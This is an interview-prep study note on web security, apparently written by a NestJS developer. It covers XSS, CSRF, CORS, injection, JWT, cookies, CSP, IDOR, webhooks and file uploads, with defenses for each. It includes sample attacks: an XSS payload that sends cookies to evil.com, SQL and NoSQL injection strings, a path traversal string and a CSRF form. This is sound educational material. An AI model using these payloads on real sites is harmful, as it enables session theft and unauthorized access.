---
title: Web Security — Answers
topic: security
tags: [interview, fullstack, security, auth, owasp]
related: ["[[04-nestjs]]", "[[07-cv-deep-dive]]"]
---

# Web Security — Answers

> [!abstract] How to use this note
> Each item has the **question**, a plain-English **explanation**, an **example**, and a **Pros / Cons** box. Numbers match [[questions/09-security|the questions file]].
> [!warning] CV-linked answers
> Items 8, 10, 19, 20, and 21 tie to your NestJS affiliate auth (JWT, token invalidation), MongoDB, and WebChat webhooks. Be ready to explain what you actually built.

---

## Beginner

### 1. XSS (Cross-Site Scripting)

> [!question] Q1
> What is XSS (Cross-Site Scripting)? What are the types and how do you prevent it? (commonly asked)

**XSS** means an attacker injects malicious JavaScript that runs in another user's browser inside your site. Because the script runs in your origin, it can steal cookies/tokens, read page content, or perform actions as the victim.

There are three main types:
- **Stored (persistent)** — the payload is saved in the database (e.g., a comment) and served to every visitor who loads that page.
- **Reflected** — the payload comes from the request and is echoed back immediately (e.g., a search query in the URL).
- **DOM-based** — client-side JavaScript reads untrusted input (e.g., `location.hash`) and writes it into the DOM without a server round trip.

Prevention: **encode/escape output by context** (HTML, attribute, URL, JS), never inject untrusted HTML (`innerHTML`, `dangerouslySetInnerHTML`), **sanitize** rich text (DOMPurify), use a **Content Security Policy (CSP)**, and rely on frameworks — React auto-escapes text in JSX by default.

> [!example]
> Attacker posts `<script>fetch('https://evil.com?c='+document.cookie)</script>` as a comment. Without sanitization, every user who views comments runs that script. Fix: store plain text, escape on output, or sanitize HTML with DOMPurify before rendering.

> [!success] Pros / Cons
> **Framework escaping + CSP:** strong default defense, low day-to-day cost. **Con:** one `dangerouslySetInnerHTML` or missed escape in a custom template can undo everything — defense must be layered, not assumed.

> [!info] Further reading
> [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)

### 2. CSRF (Cross-Site Request Forgery)

> [!question] Q2
> What is CSRF (Cross-Site Request Forgery) and how do you prevent it?

**CSRF** tricks a logged-in user's browser into sending an unwanted **authenticated** request to your site. Browsers automatically attach cookies to your domain, so if the user is logged in, a malicious page can submit a form or fetch to your API without the user knowing (e.g., change email, transfer money).

Prevention:
- **Anti-CSRF tokens** — a secret token per session/form that the attacker cannot read cross-origin.
- **`SameSite=Lax` or `Strict` cookies** — limits when cookies are sent on cross-site requests.
- **Check `Origin` / `Referer`** headers on state-changing requests.
- **Use `Authorization` header tokens** (not auto-sent cookies) for APIs, combined with CORS.

> [!example]
> User is logged into `bank.com`. They visit `evil.com`, which contains `<form action="https://bank.com/transfer" method="POST">`. The browser sends the session cookie; the transfer may succeed unless CSRF defenses block it.

> [!success] Pros / Cons
> **`SameSite` cookies:** simple, browser-enforced, good for most cases. **Con:** `SameSite=None` (needed for some cross-site flows) requires `Secure` and still needs tokens. **CSRF tokens:** very reliable. **Con:** must wire into every state-changing form/API.

> [!info] Further reading
> [OWASP CSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)

### 3. CORS (Cross-Origin Resource Sharing)

> [!question] Q3
> What is CORS? What problem does it solve, and how do you configure it correctly?

Browsers enforce the **same-origin policy**: JavaScript on `https://app.com` cannot read responses from `https://api.other.com` unless the server explicitly allows it. **CORS** is the mechanism that lets a server **opt in** to cross-origin browser requests by sending special response headers.

The server responds with headers like `Access-Control-Allow-Origin`, `Access-Control-Allow-Methods`, and `Access-Control-Allow-Headers`. For "non-simple" requests, the browser sends an **`OPTIONS` preflight** first.

Configure correctly by:
- Allowing **only trusted origins** (never `*` when credentials are used).
- Listing only the **methods and headers** you need.
- Setting `Access-Control-Allow-Credentials: true` only when required.

> [!example]
> Your React app at `https://shop.com` calls `https://api.shop.com/users`. The API must respond with `Access-Control-Allow-Origin: https://shop.com` (not `*`) if cookies are sent.

> [!success] Pros / Cons
> **Pros:** enables safe cross-origin APIs from browsers while keeping the default lock-down. **Cons:** CORS is a **browser** policy only — it does not stop curl/Postman; server-side auth is still mandatory. Misconfiguration (`Allow-Origin: *` + credentials) is a common mistake.

> [!info] Further reading
> [MDN: CORS](https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/CORS)

### 4. SQL / NoSQL Injection

> [!question] Q4
> What is SQL injection / NoSQL injection and how do you prevent it?

**Injection** happens when attacker-controlled input is interpreted as part of a query instead of plain data. In SQL, `' OR 1=1 --` can bypass a login check. In MongoDB, sending `{ "email": { "$gt": "" } }` instead of a string can match every document.

Prevention:
- **Parameterized queries / prepared statements** (SQL) — the DB treats input as data, never as code.
- **Validate and coerce types** (NoSQL) — reject objects where you expect strings.
- **Use ODM/driver safely** — never concatenate user input into query strings.
- **Whitelist** allowed values where possible.
- **Least-privilege DB accounts** — a read-only user cannot drop tables even if exploited.

> [!example]
> ```js
> // BAD — string concatenation
> db.query(`SELECT * FROM users WHERE email = '${req.body.email}'`);

> // GOOD — parameterized
> db.query('SELECT * FROM users WHERE email = $1', [req.body.email]);
> ```

> [!success] Pros / Cons
> **Parameterized queries:** the gold standard, minimal performance cost. **Con:** ORMs/raw query builders still allow unsafe patterns if misused. **Input validation:** adds defense in depth. **Con:** alone is not enough if types are not enforced.

> [!info] Further reading
> [OWASP SQL Injection Prevention](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)

### 5. Password Storage

> [!question] Q5
> Why should you never store passwords in plain text? How should you store them?

Plaintext passwords mean one database breach exposes every user's password — and many people reuse passwords across sites. You must store only a **one-way hash** that cannot be reversed.

Use a slow, salted, adaptive algorithm: **bcrypt**, **scrypt**, or **Argon2**. These include a per-user salt (defeats rainbow tables) and a **work factor** (makes brute force expensive). Never use fast hashes alone (MD5, SHA-256 without a proper password KDF).

> [!example]
> On registration: `hash = await argon2.hash(plainPassword)`. On login: `argon2.verify(hash, plainPassword)`. Store only `hash` in the database.

> [!success] Pros / Cons
> **Argon2/bcrypt:** industry standard, tunable cost. **Con:** hashing is CPU-heavy by design — you must pick a reasonable work factor. **Pepper (server-side secret mixed in):** extra layer. **Con:** if the pepper is lost, all passwords must be reset.

> [!info] Further reading
> [OWASP Password Storage Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html)

### 6. HTTPS and TLS

> [!question] Q6
> What is HTTPS and why is it important? What does TLS do?

**HTTPS** is HTTP wrapped in **TLS (Transport Layer Security)**. TLS runs before HTTP and provides three guarantees on the wire:
- **Confidentiality** — encrypts data so eavesdroppers cannot read it.
- **Authentication** — the server proves identity via a certificate signed by a trusted CA.
- **Integrity** — detects tampering in transit.

Without HTTPS, anyone on the same network (coffee shop Wi-Fi) can read or modify requests. Always use HTTPS, redirect HTTP → HTTPS, and enable **HSTS** so browsers never downgrade.

> [!example]
> A login form over HTTP sends `email=alice&password=secret` in plaintext. Over HTTPS, that payload is encrypted; only the server with the private key can decrypt it.

> [!success] Pros / Cons
> **HTTPS everywhere:** protects users, required for modern features (HTTP/2, service workers), helps SEO. **Con:** certificate management and slightly more CPU (negligible with modern hardware and TLS 1.3).

> [!info] Further reading
> [Cloudflare Learning: What is HTTPS?](https://www.cloudflare.com/learning/ssl/what-is-https/)

### 7. Authentication vs Authorization

> [!question] Q7
> What is the difference between authentication and authorization?

**Authentication (AuthN)** answers *"Who are you?"* — login, password, MFA, JWT validation. **Authorization (AuthZ)** answers *"What are you allowed to do?"* — roles, permissions, resource ownership checks.

AuthN must happen first. AuthZ must be enforced **on every request** server-side — never trust the client to hide buttons or URLs.

> [!example]
> Alice logs in (AuthN). She tries `GET /orders/999`. The server checks: does order 999 belong to Alice? (AuthZ). If not, return 403 even though she is authenticated.

> [!success] Pros / Cons
> **Clear separation:** easier to audit and test. **Con:** teams often implement AuthN well but forget AuthZ on individual resources (IDOR bugs). Both must be server-enforced.

---

## Intermediate

### 8. JWT Storage — localStorage vs Cookies

> [!question] Q8
> Where should you store a JWT on the client — localStorage vs cookies? What are the trade-offs? (your CV: JWT)

**localStorage** is easy to read from JavaScript — any XSS can steal the token. **httpOnly cookies** are not accessible to JS, which mitigates XSS token theft, but cookies are auto-sent on requests, so you need **CSRF protection** (`SameSite`, anti-CSRF tokens).

Common best practice for your affiliate-style auth:
- **Access token** — short-lived (5–15 min), sent as `Authorization: Bearer` or in memory.
- **Refresh token** — longer-lived, stored in **`httpOnly`, `Secure`, `SameSite`** cookie, rotated server-side.

> [!example]
> ```http
> Set-Cookie: refreshToken=...; HttpOnly; Secure; SameSite=Strict; Path=/auth/refresh
> ```
> JavaScript cannot read it; only your refresh endpoint receives it automatically.

> [!tip] CV tie-in
> Your NestJS affiliate platform uses JWT access tokens plus refresh-token rotation with server-side invalidation — a strong pattern to describe in interviews. See [[07-cv-deep-dive#5 Access/refresh token lifecycle & invalidation]].

> [!success] Pros / Cons
> **httpOnly cookies:** resist XSS token theft. **Con:** need CSRF defenses. **localStorage:** simple for SPAs. **Con:** any XSS = full account takeover. **Memory-only access tokens:** best XSS resistance for access token. **Con:** lost on page refresh unless refresh flow exists.

> [!info] Further reading
> [OWASP JWT Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html)

### 9. Cookie Attributes — httpOnly, Secure, SameSite

> [!question] Q9
> What are httpOnly, Secure, and SameSite cookie attributes?

- **`HttpOnly`** — JavaScript cannot read the cookie (`document.cookie`). Mitigates XSS stealing session tokens.
- **`Secure`** — cookie is sent only over HTTPS.
- **`SameSite`** — controls cross-site sending:
  - **`Strict`** — never sent on cross-site requests (strongest CSRF defense).
  - **`Lax`** — sent on top-level GET navigations (good default for sessions).
  - **`None`** — always sent cross-site; **requires `Secure`** (needed for embedded/cross-site flows).

Also scope with `Path`/`Domain` and set sensible expiry.

> [!example]
> Session cookie: `Set-Cookie: sid=abc; HttpOnly; Secure; SameSite=Lax; Path=/; Max-Age=3600`

> [!success] Pros / Cons
> **`SameSite=Lax`:** blocks most CSRF with zero app code. **Con:** breaks some legitimate cross-site POST flows. **`Strict`:** strongest. **Con:** user may appear logged out when arriving from external links.

> [!info] Further reading
> [MDN: Set-Cookie](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Set-Cookie)

### 10. JWT Mechanics and Security Pitfalls

> [!question] Q10
> How do JWTs work, and what are their security pitfalls (algorithm confusion, no revocation, long expiry)?

A JWT has three parts: **header** (algorithm), **payload** (claims like `sub`, `exp`), and **signature**. The server verifies the signature with a secret/public key and trusts the claims without a DB lookup — **stateless**.

Pitfalls:
- **Algorithm confusion** — attacker sets `alg: none` or swaps RS256/HS256. **Fix:** always pin the expected algorithm in code.
- **No built-in revocation** — a valid token works until expiry. **Fix:** short access-token TTL + refresh rotation + blocklist for logout.
- **Sensitive data in payload** — JWT is base64, not encrypted. Never put secrets/PII inside.
- **Long expiry** — stolen tokens stay valid too long. Keep access tokens short.

> [!example]
> ```json
> // Header.Payload.Signature
> { "alg": "HS256" }.{ "sub": "user123", "exp": 1710000000 }.[signature]
> ```
> Server: verify signature with `JWT_SECRET`, check `exp`, `iss`, `aud`.

> [!tip] CV tie-in
> Your affiliate auth issues short-lived access JWTs and rotates refresh tokens server-side — directly addressing the "no revocation" pitfall. See [[04-nestjs]] and [[07-cv-deep-dive#5 Access/refresh token lifecycle & invalidation]].

> [!success] Pros / Cons
> **Pros:** stateless, scales horizontally, no session store lookup per request. **Cons:** hard to revoke instantly, token size grows with claims, easy to misconfigure (algorithm, expiry, storage).

### 11. Principle of Least Privilege

> [!question] Q11
> What is the principle of least privilege and why does it matter?

Every user, service account, API token, and DB user should have **only the minimum permissions** needed for their job — nothing more. If credentials leak, the attacker’s damage is limited.

Apply to: DB roles (read-only vs admin), API scopes, cloud IAM policies, and internal admin panels.

> [!example]
> A reporting service DB user has `SELECT` on `orders` only — not `DROP TABLE`. A leaked credential cannot wipe the database.

> [!success] Pros / Cons
> **Pros:** smaller blast radius on breach, easier compliance auditing. **Con:** requires ongoing permission reviews; over-restriction can block legitimate work if not documented.

> [!info] Further reading
> [OWASP Authorization Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Authorization_Cheat_Sheet.html)

### 12. Secrets and API Key Handling

> [!question] Q12
> How do you securely handle secrets and API keys in an app?

- Never commit secrets to git — use `.env` locally, **secrets manager/vault** or injected env vars in production.
- **Rotate** regularly and **scope minimally** (per-service keys).
- Never log secrets or return them in API responses.
- Never ship secrets to the client — no `NEXT_PUBLIC_` for API keys that must stay private.
- Use **different secrets per environment** (dev/staging/prod).

> [!example]
> ```bash
> # .env (gitignored)
> DATABASE_URL=postgres://...
> JWT_SECRET=...

> # Next.js — only public config gets NEXT_PUBLIC_
> NEXT_PUBLIC_API_URL=https://api.example.com  # OK — not secret
> ```

> [!success] Pros / Cons
> **Secrets manager (AWS SM, Vault):** centralized rotation, audit trail. **Con:** operational overhead. **Env vars:** simple. **Con:** easy to leak via logs, error dumps, or accidental client exposure.

> [!info] Further reading
> [OWASP Secrets Management Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html)

### 13. Rate Limiting

> [!question] Q13
> What is rate limiting and how does it protect against brute force and abuse?

**Rate limiting** caps how many requests a client (IP, user, API key) can make in a time window. It protects against **brute-force login**, credential stuffing, scraping, and simple DoS.

Implement with token bucket or sliding window algorithms. Use **Redis** for consistent limits across multiple server instances. Return **`429 Too Many Requests`** with **`Retry-After`**. Apply stricter limits on auth endpoints.

> [!example]
> Login: max 5 attempts per IP per 15 minutes. After limit: `429` + lockout or CAPTCHA. Affiliate API: 100 req/min per API key.

> [!success] Pros / Cons
> **Pros:** cheap, effective against automated abuse. **Con:** shared IPs (offices, NAT) can hit limits unfairly; tune per-endpoint and offer unlock paths.

> [!info] Further reading
> [Cloudflare Learning: Rate Limiting](https://www.cloudflare.com/learning/bots/what-is-rate-limiting/)

### 14. Preventing Sensitive Data Exposure in APIs

> [!question] Q14
> How do you prevent sensitive data exposure in APIs (over-fetching, error leakage)?

- Return **only needed fields** — use DTOs/projections, avoid `SELECT *`.
- Never send **stack traces or internal errors** to clients — log details server-side, return generic messages.
- **Redact PII/secrets** in logs.
- **Encrypt at rest and in transit**.
- Enforce **authorization on every resource** — users must not read others' data.

> [!example]
> User profile endpoint returns `{ id, name, avatar }` — not `{ passwordHash, internalNotes, ssn }`. On 500 error: `{ "message": "Internal server error" }` — not the MongoDB connection string.

> [!success] Pros / Cons
> **DTOs + projection:** precise, testable. **Con:** maintenance as schemas evolve. **Generic errors:** safer. **Con:** harder to debug client-side without correlation IDs.

### 15. Clickjacking

> [!question] Q15
> What is clickjacking and how do you prevent it (X-Frame-Options, CSP frame-ancestors)?

**Clickjacking** embeds your site in a transparent iframe on a malicious page. The user thinks they click a button on the attacker's page, but they actually click your "Delete account" or "Transfer" button underneath.

Prevent by controlling who can frame your site:
- **`X-Frame-Options: DENY`** or **`SAMEORIGIN`** (legacy but widely supported).
- **CSP `frame-ancestors 'none'`** or `'self'` (modern, preferred).

> [!example]
> ```http
> Content-Security-Policy: frame-ancestors 'self';
> X-Frame-Options: SAMEORIGIN
> ```

> [!success] Pros / Cons
> **`frame-ancestors`:** flexible (allow specific partners). **Con:** older browsers need `X-Frame-Options` fallback. **`DENY`:** strongest. **Con:** blocks all legitimate embedding (e.g., payment widgets) unless carefully scoped.

> [!info] Further reading
> [MDN: CSP frame-ancestors](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Content-Security-Policy/frame-ancestors)

---

## Advanced

### 16. OWASP Top 10 (High Level)

> [!question] Q16
> Walk through the OWASP Top 10 at a high level. (commonly asked)

The [OWASP Top 10](https://owasp.org/www-project-top-ten/) lists the most critical web application risks. Know the name, example, and fix for each:

1. **Broken Access Control** — users access resources they shouldn't (IDOR). Fix: enforce AuthZ server-side.
2. **Cryptographic Failures** — weak/missing encryption (plaintext passwords, HTTP). Fix: TLS, strong hashing.
3. **Injection** — SQL/NoSQL/command injection. Fix: parameterized queries, validation.
4. **Insecure Design** — missing security in architecture. Fix: threat modeling, secure defaults.
5. **Security Misconfiguration** — debug on in prod, default creds, open buckets. Fix: hardening checklists.
6. **Vulnerable Components** — outdated libraries. Fix: dependency scanning, patching.
7. **Identification & Authentication Failures** — weak login, no MFA. Fix: strong auth, rate limits.
8. **Software & Data Integrity Failures** — unsigned updates, CI/CD compromise. Fix: signing, SRI.
9. **Security Logging & Monitoring Failures** — no alerts on attacks. Fix: centralized logging, SIEM.
10. **Server-Side Request Forgery (SSRF)** — server fetches attacker-controlled URLs. Fix: allowlists, network segmentation.

> [!success] Pros / Cons
> **Pros:** industry-standard vocabulary for interviews and audits. **Con:** list changes over time — cite the 2021 edition and know your app's top risks, not just memorize names.

> [!info] Further reading
> [OWASP Top 10 (2021)](https://owasp.org/Top10/)

### 17. Content Security Policy (CSP)

> [!question] Q17
> What is a Content Security Policy (CSP) and how does it mitigate XSS?

**CSP** is an HTTP response header that whitelists allowed sources for scripts, styles, images, fonts, and frames. It mitigates XSS because even if an attacker injects a `<script>`, the browser blocks it unless the source is allowed.

Strong policies:
- `script-src 'self'` — block inline scripts.
- Use **nonces** or **hashes** for legitimate inline scripts.
- Start with **`Content-Security-Policy-Report-Only`** to collect violations without breaking the site.

> [!example]
> ```http
> Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-abc123'; style-src 'self' 'unsafe-inline'
> ```

> [!success] Pros / Cons
> **Pros:** powerful XSS mitigation, blocks unexpected third-party scripts. **Con:** hard to roll out on legacy apps with many inline scripts; requires nonce/hash discipline in build pipeline.

> [!info] Further reading
> [MDN: Content Security Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/CSP)

### 18. Secure Authentication + Session System (End to End)

> [!question] Q18
> How do you design a secure authentication + session system end to end?

A production-grade design:

1. **Registration/login** — Argon2/bcrypt hashing, optional MFA, rate limiting, account lockout.
2. **Issue tokens** — short-lived access JWT + long-lived refresh token in `httpOnly`/`Secure`/`SameSite` cookie.
3. **Rotate refresh tokens** on every use; detect reuse (theft) and revoke the session family.
4. **Enforce AuthZ** on every API call server-side.
5. **Transport** — HTTPS + HSTS everywhere.
6. **Logout/password change** — invalidate refresh token server-side immediately.
7. **Monitor** — log auth events, alert on anomalies.

> [!example]
> Flow: `POST /login` → set httpOnly refresh cookie + return access JWT → client uses Bearer token → on 401, `POST /auth/refresh` (cookie auto-sent) → new access + rotated refresh → on logout, delete server-side refresh hash.

> [!success] Pros / Cons
> **Access + refresh with rotation:** balances stateless speed and revocability. **Con:** more moving parts than a single long-lived JWT. **Server sessions:** easy revocation. **Con:** needs shared session store at scale.

> [!info] Further reading
> [OWASP Authentication Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html)

### 19. MongoDB / Mongoose Injection Prevention

> [!question] Q19
> How do you prevent injection in a MongoDB/Mongoose app specifically? (your CV: MongoDB)

NoSQL injection in MongoDB happens when user input becomes a **query operator**. Example: `{ email: req.body.email }` where `email` is `{ "$gt": "" }` matches all users.

Prevention:
- **Validate/coerce types** — expect string, reject objects (`class-validator` DTOs).
- **Mongoose schema validation** — enforce types at the model layer.
- **Sanitize operators** — `express-mongo-sanitize` strips `$` and `.` from user input.
- Never pass raw `req.body` as a query filter; **whitelist** allowed filter fields.

> [!example]
> ```js
> // BAD
> User.findOne({ email: req.body.email });

> // GOOD — validated DTO ensures email is a string
> User.findOne({ email: dto.email }); // dto.email: string, validated
> ```

> [!tip] CV tie-in
> Your NestJS affiliate and ads platforms use Mongoose with DTO validation — mention `class-validator` + `express-mongo-sanitize` as your defense stack. See [[16-mongodb]].

> [!success] Pros / Cons
> **DTO validation + sanitize:** low overhead, catches most attacks. **Con:** custom aggregation pipelines need the same discipline — sanitizers don't cover every code path.

> [!info] Further reading
> [OWASP NoSQL Injection](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection)

### 20. Refresh Token Theft and Reuse Detection

> [!question] Q20
> How do you handle refresh token theft and detect token reuse? (your CV: token invalidation)

**Token rotation:** every time a refresh token is used, issue a new one and invalidate the old one. Store a **hash of the current valid refresh token** server-side per session "family."

**Reuse detection:** if a previously rotated (old) token is presented, that signals theft — someone else has a copy. **Revoke the entire session family** and force re-login for all devices in that family.

Additional hardening: bind tokens to device fingerprint where feasible, keep refresh tokens in httpOnly cookies, keep access tokens short-lived.

> [!example]
> User refreshes → server issues `refresh_v2`, marks `refresh_v1` as used. Attacker tries `refresh_v1` → server detects reuse → revokes all tokens for that user session → both attacker and user must re-authenticate.

> [!tip] CV tie-in
> This is exactly your affiliate platform's invalidation strategy — rotate on use, revoke on reuse, invalidate on logout/password change. Strong interview story. See [[07-cv-deep-dive#5 Access/refresh token lifecycle & invalidation]].

> [!success] Pros / Cons
> **Rotation + reuse detection:** industry best practice for refresh tokens. **Con:** requires server-side state (token family store) — not fully stateless. **Blocklist-only:** simpler. **Con:** doesn't detect theft until the legitimate user refreshes.

### 21. Webhook Security

> [!question] Q21
> What are common webhook security concerns and how do you secure them? (your CV: webhooks)

Webhooks are HTTP callbacks from third parties (Crisp, Stripe, GitHub). Risks: forged payloads, replay attacks, duplicate processing, slow handlers causing retries.

Secure them by:
- **Verify signatures** — HMAC of the raw body with a shared secret; reject mismatches.
- **HTTPS only**.
- **Idempotency** — deduplicate by event ID (providers retry).
- **Replay protection** — validate timestamp tolerance window.
- **Respond fast (2xx)** — process async via queue (RabbitMQ).
- **Whitelist source IPs** if the provider publishes them.

> [!example]
> ```js
> const sig = hmacSha256(rawBody, WEBHOOK_SECRET);
> if (sig !== req.headers['x-signature']) throw UnauthorizedException();
> if (await processedEvents.has(eventId)) return { ok: true }; // idempotent
> await queue.publish(event); // async processing
> return { ok: true };
> ```

> [!tip] CV tie-in
> Your WebChat Crisp integration verifies signatures, responds quickly, and processes events idempotently via queues — cite this directly. See [[07-cv-deep-dive#27 Webhooks reliability]] and [[04-nestjs]].

> [!success] Pros / Cons
> **HMAC verification:** strong authenticity check. **Con:** secret rotation must be coordinated with provider. **Async queue processing:** reliable under load. **Con:** eventual consistency — design UI for it.

> [!info] Further reading
> [OWASP Webhook Security](https://cheatsheetseries.owasp.org/cheatsheets/Webhook_Security_Cheat_Sheet.html)

### 22. IDOR (Insecure Direct Object Reference)

> [!question] Q22
> How do you protect against IDOR (Insecure Direct Object Reference)?

**IDOR** occurs when an app exposes a direct reference (`/orders/123`) and does not verify the requester owns or may access that resource. An attacker changes `123` → `124` and reads someone else's order.

Prevention:
- **Authorization check on every object access** — "Does this user own this order?"
- Use **non-guessable IDs** (UUIDs) where helpful (security through obscurity is not enough alone).
- Never trust client-supplied IDs without an ownership join/check in the query.

> [!example]
> ```js
> // BAD
> Order.findById(req.params.id);

> // GOOD
> Order.findOne({ _id: req.params.id, userId: req.user.id });
> ```

> [!success] Pros / Cons
> **Ownership filter in query:** simple, hard to bypass. **Con:** easy to forget on new endpoints — use middleware/guards consistently. **UUIDs:** reduce enumeration. **Con:** don't replace AuthZ checks.

> [!info] Further reading
> [OWASP IDOR](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/04-Testing_for_Insecure_Direct_Object_References)

### 23. Secure File Upload

> [!question] Q23
> How would you secure a file upload feature?

- **Validate type by content** (magic bytes), not just file extension.
- Enforce **size limits**.
- Store **outside the web root** or in object storage (S3) with restricted permissions.
- Generate **random filenames** — prevent path traversal (`../../etc/passwd`).
- **Scan for malware** (ClamAV or cloud scanner).
- **Never execute** uploaded files on the server.
- Serve with correct **`Content-Type`** and **`Content-Disposition: attachment`** for downloads.
- Use **signed upload URLs** so files go directly to storage, not through your app server.

> [!example]
> User uploads `avatar.jpg`. Server checks magic bytes (`FF D8 FF`), renames to `uuid.webp`, stores in S3, serves via CDN with `Content-Disposition: inline` only for images — never from `/uploads/` on the app server.

> [!success] Pros / Cons
> **Signed S3 uploads:** app server never handles raw bytes — scales well. **Con:** more setup. **Magic-byte validation:** stops `.exe` renamed as `.jpg`. **Con:** polyglot files need extra checks.

> [!info] Further reading
> [OWASP File Upload Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html)

---

## Related notes
- [[04-nestjs]] — guards, JWT auth, webhook handlers in your NestJS projects.
- [[07-cv-deep-dive]] — affiliate token invalidation, WebChat webhook reliability stories.
- [[16-mongodb]] — NoSQL injection prevention and query optimization.
- [[10-networking-http#24 CORS preflight]] — how browsers enforce cross-origin rules.
- [[06-system-design#13 JWT auth system]] — designing auth at system level.

## References & Further Study
- [OWASP Top 10 (2021)](https://owasp.org/Top10/) — the standard risk list for interviews.
- [OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/) — practical guides for XSS, CSRF, auth, JWT, file upload.
- [MDN Web Security](https://developer.mozilla.org/en-US/docs/Web/Security) — CORS, CSP, cookies, HTTPS.
- [web.dev: Secure](https://web.dev/explore/secure) — browser security concepts for frontend developers.
- [Cloudflare Learning Center — Security](https://www.cloudflare.com/learning/security/what-is-web-application-security/) — high-level web app security overview.
